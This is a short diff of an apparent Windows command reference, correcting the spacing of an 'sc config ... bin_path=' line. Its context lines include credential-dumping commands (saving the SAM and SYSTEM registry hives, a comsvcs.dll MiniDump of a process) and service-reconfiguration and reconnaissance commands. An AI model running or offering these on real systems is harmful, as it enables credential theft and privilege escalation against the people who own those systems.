@@ -8,7 +8,7 @@ reg save HKLM\SAM PATH
 reg save HKLM\SYSTEM PATH
 runas /user:DOMAIN\USERNAME /savecred PATH
 rundll32 C:\Windows\System32\comsvcs.dll, MiniDump PID PATH full
-sc config SERVICE bin_path="PATH"
+sc config SERVICE bin_path= "PATH"
 sc qc SERVICE
 systeminfo
 tasklist /svc
